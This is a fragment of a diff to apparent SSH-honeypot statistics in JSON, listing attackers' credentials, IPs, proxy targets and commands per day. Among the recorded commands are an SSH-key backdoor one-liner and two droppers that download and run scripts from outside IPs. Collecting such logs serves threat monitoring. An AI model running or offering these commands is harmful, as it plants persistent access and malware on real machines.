       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 712,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 712
     },
     {
       "input": "uname -a",
-      "count": 71,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 71
     },
     {
       "input": "rm -rf /var/tmp/dota*",
-      "count": 15,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 15
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.165",
       "dst_port": 2222,
-      "count": 1278,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1278
     },
     {
       "src_ip": "5.188.86.210",
       "dst_port": 2222,
-      "count": 1176,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1176
     },
     {
       "src_ip": "5.188.87.57",
       "dst_port": 2222,
-      "count": 1165,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1165
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.221",
       "robot": true,
-      "count": 1021,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1021
     },
     {
       "src_ip": "5.188.87.53",
       "robot": true,
-      "count": 897,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 897
     },
     {
       "src_ip": "5.188.86.165",
       "robot": true,
-      "count": 886,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 886
     }
   ],
   "file_download": [
@@ -3199,9 +2409,7 @@
         "positives": 26,
         "total": 60
       },
-      "count": 1,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3210,9 +2418,7 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3221,32 +2427,24 @@
         "positives": null,
         "total": null
       },
-      "count": 1,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "101.230.251.216",
-      "count": 13,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 13
     },
     {
       "filename": "dota3.tar.gz",
       "src_ip": "106.56.102.44",
-      "count": 1,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "187.207.125.160",
-      "count": 1,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -3254,25 +2452,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "184.150.200.206",
       "dst_port": 443,
-      "count": 1931,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1931
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "chekfast.zennolab.com",
       "dst_port": 80,
-      "count": 1292,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1292
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "check2.zennolab.com",
       "dst_port": 80,
-      "count": 1246,
-      "date": "2021-06-15",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1246
     }
   ]
 },
@@ -3283,109 +2475,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18173,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18173
     },
     {
       "username": "root",
       "password": "beatriz",
-      "count": 282,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 282
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 95,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 95
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 105,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 105
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 99,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 99
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 99,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 99
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 91,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 91
     },
     {
       "input": "uname -a",
-      "count": 10,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 10
     },
     {
       "input": "uname -s -v -n -r",
-      "count": 6,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 6
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.206",
       "dst_port": 2222,
-      "count": 1483,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1483
     },
     {
       "src_ip": "5.188.86.178",
       "dst_port": 2222,
-      "count": 1318,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1318
     },
     {
       "src_ip": "5.188.87.60",
       "dst_port": 2222,
-      "count": 1076,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1076
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.206",
       "robot": true,
-      "count": 1119,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1119
     },
     {
       "src_ip": "5.188.86.178",
       "robot": true,
-      "count": 924,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 924
     },
     {
       "src_ip": "5.188.87.57",
       "robot": true,
-      "count": 801,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 801
     }
   ],
   "file_download": [
@@ -3396,9 +2558,7 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3407,9 +2567,7 @@
         "positives": 0,
         "total": 59
       },
-      "count": 1,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3418,32 +2576,24 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota.tar.gz",
       "src_ip": "122.51.27.41",
-      "count": 1,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "69.172.87.212",
-      "count": 1,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "103.235.170.195",
-      "count": 1,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -3451,25 +2601,19 @@
       "src_ip": "5.188.86.206",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 1121,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1121
     },
     {
       "src_ip": "5.188.86.178",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 923,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 923
     },
     {
       "src_ip": "5.188.87.57",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 806,
-      "date": "2021-05-08",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 806
     }
   ]
 },
@@ -3480,109 +2624,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18829,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18829
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 1399,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1399
     },
     {
       "username": "root",
       "password": "12345678",
-      "count": 277,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 277
     }
   ],
   "commands": [
     {
       "input": "uname -a",
-      "count": 1434,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1434
     },
     {
       "input": "cat /proc/cpuinfo | grep name | wc -l",
-      "count": 1433,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1433
     },
     {
       "input": "cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'",
-      "count": 1428,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1428
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 1394,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1394
     },
     {
       "input": "uname -a ; lscpu",
-      "count": 37,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 37
     },
     {
       "input": "rm -rf /var/tmp/dota*",
-      "count": 31,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 31
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.86.178",
       "dst_port": 2222,
-      "count": 1375,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1375
     },
     {
       "src_ip": "5.188.87.58",
       "dst_port": 2222,
-      "count": 1221,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1221
     },
     {
       "src_ip": "5.188.86.168",
       "dst_port": 2222,
-      "count": 995,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 995
     }
   ],
   "session_closed": [
     {
       "src_ip": "5.188.86.178",
       "robot": true,
-      "count": 990,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 990
     },
     {
       "src_ip": "5.188.87.58",
       "robot": true,
-      "count": 932,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 932
     },
     {
       "src_ip": "5.188.86.167",
       "robot": true,
-      "count": 759,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 759
     }
   ],
   "file_download": [
@@ -3593,9 +2707,7 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3604,9 +2716,7 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3615,25 +2725,19 @@
         "positives": 0,
         "total": 58
       },
-      "count": 1,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota3.tar.gz",
       "src_ip": "222.180.250.42",
-      "count": 30,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 30
     },
     {
       "filename": "dota.tar.gz",
       "src_ip": "119.136.154.86",
-      "count": 1,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -3641,25 +2745,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "chek.zennolab.com",
       "dst_port": 80,
-      "count": 1124,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1124
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 1123,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1123
     },
     {
       "src_ip": "5.188.86.178",
       "dst_ip": "ya.ru",
       "dst_port": 80,
-      "count": 987,
-      "date": "2021-05-12",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 987
     }
   ]
 },
@@ -3670,109 +2768,79 @@
     {
       "username": "root",
       "password": "1234",
-      "count": 18754,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 18754
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 655,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 655
     },
     {
       "username": "root",
       "password": "fuckyou",
-      "count": 48,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 48
     }
   ],
   "commands": [
     {
       "input": "echo -e \"\\x6F\\x6B\"",
-      "count": 1298,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1298
     },
     {
       "input": "uname -a",
-      "count": 689,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 689
     },
     {
       "input": "uname -m",
-      "count": 682,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 682
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "echo -e \"\\x6F\\x6B\"",
-      "count": 1298,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1298
     },
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 629,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 629
     },
     {
       "input": "rm -rf /var/tmp/dota*",
-      "count": 41,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 41
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.51",
       "dst_port": 2222,
-      "count": 1304,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1304
     },
     {
       "src_ip": "121.196.106.61",
       "dst_port": 2222,
-      "count": 1299,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1299
     },
     {
       "src_ip": "5.188.86.206",
       "dst_port": 2222,
-      "count": 1248,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1248
     }
   ],
   "session_closed": [
     {
       "src_ip": "121.196.106.61",
       "robot": false,
-      "count": 1295,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1295
     },
     {
       "src_ip": "5.188.86.206",
       "robot": true,
-      "count": 900,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 900
     },
     {
       "src_ip": "5.188.86.212",
       "robot": true,
-      "count": 890,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 890
     }
   ],
   "file_download": [
@@ -3783,9 +2851,7 @@
         "positives": 0,
         "total": 60
       },
-      "count": 1,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3794,9 +2860,7 @@
         "positives": 0,
         "total": 59
       },
-      "count": 1,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     },
     {
       "url": null,
@@ -3805,32 +2869,24 @@
         "positives": 0,
         "total": 60
       },
-      "count": 1,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "file_upload": [
     {
       "filename": "dota3.tar.gz",
       "src_ip": "111.161.74.112",
-      "count": 29,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 29
     },
     {
       "filename": "dota3.tar.gz",
       "src_ip": "121.241.244.92",
-      "count": 11,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 11
     },
     {
       "filename": "dota3.tar.gz",
       "src_ip": "37.34.208.91",
-      "count": 1,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1
     }
   ],
   "proxy_request": [
@@ -3838,25 +2894,19 @@
       "src_ip": "45.227.255.163",
       "dst_ip": "www.google.ru",
       "dst_port": 443,
-      "count": 5304,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 5304
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "184.150.200.206",
       "dst_port": 443,
-      "count": 2452,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 2452
     },
     {
       "src_ip": "45.227.255.163",
       "dst_ip": "check2.zennolab.com",
       "dst_port": 80,
-      "count": 1193,
-      "date": "2021-06-11",
-      "sensor": "ubuntu-18-04-lts-honeypot-mongodb-connection-s-1vcpu-1gb-fra1-02"
+      "count": 1193
     }
   ]
 },
@@ -3867,109 +2917,79 @@
     {
       "username": "root",
       "password": "admin",
-      "count": 5850,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 5850
     },
     {
       "username": "root",
       "password": "123",
-      "count": 690,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 690
     },
     {
       "username": "nproc",
       "password": "nproc",
-      "count": 382,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 382
     }
   ],
   "commands": [
     {
       "input": "crontab -l",
-      "count": 385,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 385
     },
     {
       "input": "which ls",
-      "count": 385,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 385
     },
     {
       "input": "ls -lh $(which ls)",
-      "count": 385,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 385
     }
   ],
   "pre_disconnect_command": [
     {
       "input": "cd ~ && rm -rf .ssh && mkdir .ssh && echo \"ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr\">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~",
-      "count": 383,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 383
     },
     {
       "input": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://51.75.191.234/sh; curl -O http://51.75.191.234/sh; chmod 777 sh; sh sh; tftp 51.75.191.234 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r .sh -g 51.75.191.234; chmod 777 .sh; sh .sh; ftpget -v -u anonymous -p anonymous -P 21 51.75.191.234 .sh .sh; sh .sh; rm -rf sh bins.sh .sh .sh; rm -rf *",
-      "count": 11,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 11
     },
     {
       "input": "cd /tmp || cd /run || cd /; wget http://142.11.216.5/xxxbins.sh; chmod 777 xxxbins.sh; sh xxxbins.sh; tftp 142.11.216.5 -c get xxxtftp1.sh; chmod 777 xxxtftp1.sh; sh xxxtftp1.sh; tftp -r xxxtftp2.sh -g 142.11.216.5; chmod 777 xxxtftp2.sh; sh xxxtftp2.sh; rm -rf xxxbins.sh xxxtftp1.sh xxxtftp2.sh; rm -rf *",
-      "count": 11,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 11
     }
   ],
   "connect": [
     {
       "src_ip": "5.188.87.53",
       "dst_port": 2222,
-      "count": 549,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 549
     },
     {
       "src_ip": "5.188.87.49",
       "dst_port": 2222,
-      "count": 466,
-      "date": "2021-03-18",
-      "sensor": "ubuntu-18-04-lts-honeypot-s-1vcpu-1gb-fra1-01"
+      "count": 466
     },
     {
       "src_ip": "5.188.86.168",
       "dst_port": 2222,
-      "count": 410,
-      "date": "2021-03-18",
